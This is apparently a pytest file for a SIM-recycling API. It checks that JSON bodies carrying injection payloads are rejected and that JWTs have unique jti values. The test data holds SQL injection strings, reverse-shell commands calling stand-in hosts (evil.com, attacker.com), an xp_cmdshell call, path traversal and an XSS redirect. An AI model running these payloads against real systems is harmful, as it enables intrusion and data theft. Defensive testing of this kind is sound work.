import pytest
from httpx import AsyncClient
from datetime import datetime, timezone


@pytest.mark.asyncio
class TestJSONBodyInjectionBlocking:

    async def test_sql_injection_in_json_body_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/recycled-sims",
            json={
                "sim_serial": "SAFE_SERIAL_001",
                "msisdn": "+2348012345678",
                "imsi": "621200000000001",
                "operator_code": "MTN",
                "date_recycled": datetime.now(timezone.utc).isoformat(),
                "reason": "'; DROP TABLE users; --",
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_union_select_in_json_body_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/delink-requests",
            json={
                "recycled_sim_id": 1,
                "request_type": "both",
                "reason": "UNION SELECT * FROM users WHERE 1=1",
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_shell_injection_in_json_body_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/recycled-sims",
            json={
                "sim_serial": "; bash -i >& /dev/tcp/evil.com/4444 0>&1",
                "msisdn": "+2348012345678",
                "imsi": "621200000000001",
                "operator_code": "MTN",
                "date_recycled": datetime.now(timezone.utc).isoformat(),
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_reverse_shell_in_reason_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/delink-requests",
            json={
                "recycled_sim_id": 1,
                "request_type": "both",
                "reason": "; nc -e /bin/sh attacker.com 4444",
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_exec_command_in_body_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/recycled-sims",
            json={
                "sim_serial": "EXEC xp_cmdshell 'whoami'",
                "msisdn": "+2348012345678",
                "imsi": "621200000000001",
                "operator_code": "MTN",
                "date_recycled": datetime.now(timezone.utc).isoformat(),
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_path_traversal_in_body_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/recycled-sims",
            json={
                "sim_serial": "../../etc/passwd",
                "msisdn": "+2348012345678",
                "imsi": "621200000000001",
                "operator_code": "MTN",
                "date_recycled": datetime.now(timezone.utc).isoformat(),
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_xss_in_nested_body_blocked(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/webhooks/register",
            json={
                "subscriber_name": "<script>document.location='http://evil.com'</script>",
                "callback_url": "https://safe.example.com/webhook",
                "events": ["delink_completed"],
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 400

    async def test_safe_json_body_passes(
        self, test_client: AsyncClient, access_token
    ):
        response = await test_client.post(
            "/api/v1/data-subject/access-request",
            json={
                "email": "user@example.com",
                "request_type": "access",
                "reason": "I would like to review my personal data",
            },
            headers={"Authorization": f"Bearer {access_token}"},
        )
        assert response.status_code == 200


@pytest.mark.asyncio
class TestJWTRevocationOnLogout:

    async def test_access_token_has_jti(self, access_token):
        from fast_api.auth.authlib.jwt_handler import JWTHandler
        payload = JWTHandler.verify_token(access_token)
        assert "jti" in payload
        assert len(payload["jti"]) == 32

    async def test_access_token_jti_unique(self, test_user):
        from fast_api.auth.authlib.jwt_handler import JWTHandler
        token1 = JWTHandler.create_access_token(
            data={"sub": str(test_user.id), "email": test_user.email, "role": test_user.role}
        )
        token2 = JWTHandler.create_access_token(
            data={"sub": str(test_user.id), "email": test_user.email, "role": test_user.role}
        )
        payload1 = JWTHandler.verify_token(token1)
        payload2 = JWTHandler.verify_token(token2)
        assert payload1["jti"] != payload2["jti"]
